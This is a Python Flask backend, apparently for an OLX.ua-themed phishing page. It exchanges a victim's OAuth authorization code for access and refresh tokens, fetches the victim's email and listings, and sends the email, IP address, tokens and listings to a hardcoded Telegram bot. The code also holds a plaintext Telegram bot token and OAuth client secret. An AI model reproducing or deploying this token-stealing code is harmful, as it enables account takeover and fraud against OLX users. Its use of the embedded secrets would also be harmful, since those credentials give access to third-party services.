from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import os
import json

app = Flask(__name__)

# ---- КОНФИГУРАЦИЯ ----
TG_TOKEN = "8690988862:AAEWmxb3H3_4N3mhSmqjyVsOfpkczPjZ628"
TG_CHAT_ID = "-1003818732408"
CLIENT_ID = "202421"
CLIENT_SECRET = "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf"
REDIRECT_URI = "https://maun-producton.up.railway.app/" 

OLX_LOGO = "https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/OLX_green_logo.svg/250px-OLX_green_logo.svg.png"

def send_telegram_message(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                     json={"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True},
                     timeout=10)
    except Exception as e:
        print(f"Ошибка ТГ: {e}")

@app.route('/')
def index():
    ads_cookie = request.cookies.get('user_ads')
    user_ads = []
    if ads_cookie:
        try:
            user_ads = json.loads(ads_cookie)
        except:
            user_ads = []
    
    try:
        with open('index.html', 'r', encoding='utf-8') as f:
            html_content = f.read()
            return render_template_string(html_content, user_ads=user_ads)
    except Exception as e:
        return f"Ошибка шаблона: {e}", 500

@app.route('/get_token', methods=['POST'])
def get_token():
    data = request.get_json(silent=True) or {}
    code = data.get('code')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    if not code: 
        return jsonify({"error": "No code"}), 400

    try:
        # 1. Запрос токена (БЕЗ ЛИШНИХ ФЛАГОВ)
        token_res = requests.post('https://www.olx.ua/api/open/oauth/token', data={
            'grant_type': 'authorization_code',
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'code': code,
            'redirect_uri': REDIRECT_URI,
            'scope': 'read write v2'
        }, timeout=15)
        
        if token_res.status_code != 200:
            send_telegram_message(f"❌ <b>Ошибка OLX API:</b> {token_res.status_code}\n{token_res.text[:200]}")
            return jsonify({"error": "Auth failed"}), 400
            
        res_data = token_res.json()
        access = res_data.get('access_token')
        refresh = res_data.get('refresh_token')
        headers = {"Authorization": f"Bearer {access}", "Version": "2.0"}

        # 2. Данные юзера
        email = "Не указан"
        try:
            u = requests.get("https://www.olx.ua/api/partner/users/me", headers=headers, timeout=5).json()
            email = u.get('data', {}).get('email', email)
        except: pass

        # 3. Объявления
        ad_list_for_cookie = []
        ads_flat_tg = ""
        
        try:
            ads_api_res = requests.get("https://www.olx.ua/api/partner/adverts", headers=headers, params={"limit": 10}, timeout=7).json()
            ads_data = ads_api_res.get('data', [])
            
            for i, ad in enumerate(ads_data):
                title = ad.get('title', 'Без названия')
                url = ad.get('url', 'https://olx.ua')
                
                # Сохраняем ТОЛЬКО 3 ШТУКИ, чтобы кука была супер-легкой
                if len(ad_list_for_cookie) < 3:
                    ad_list_for_cookie.append({
                        "title": (title[:25] + '..') if len(title) > 25 else title,
                        "url": url,
                        "img": OLX_LOGO
                    })
                
                ads_flat_tg += f"{i+1}. <a href='{url}'>{title}</a>\n"
        except Exception as e: 
            ads_flat_tg = f"Ошибка парсинга товаров: {e}"

        # 4. Лог
        msg = (f"👤 <b>Вход:</b> <code>{email}</code>\n"
               f"🌐 <b>IP:</b> <code>{user_ip}</code>\n\n"
               f"🔑 <b>Access:</b> <code>{access}</code>\n\n"
               f"🔄 <b>Refresh:</b> <code>{refresh}</code>\n\n"
               f"📦 <b>Товары:</b>\n{ads_flat_tg}")
        send_telegram_message(msg)

        # 5. ОТВЕТ (Упростили куку до минимума)
        resp = make_response(jsonify({"status": "ok"}))
        # Обычная кука без наворотов, чтобы точно прошла
        resp.set_cookie('user_ads', json.dumps(ad_list_for_cookie), max_age=3600, path='/')
        return resp

    except Exception as e:
        send_telegram_message(f"⚠️ <b>Критическая ошибка:</b> {str(e)}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
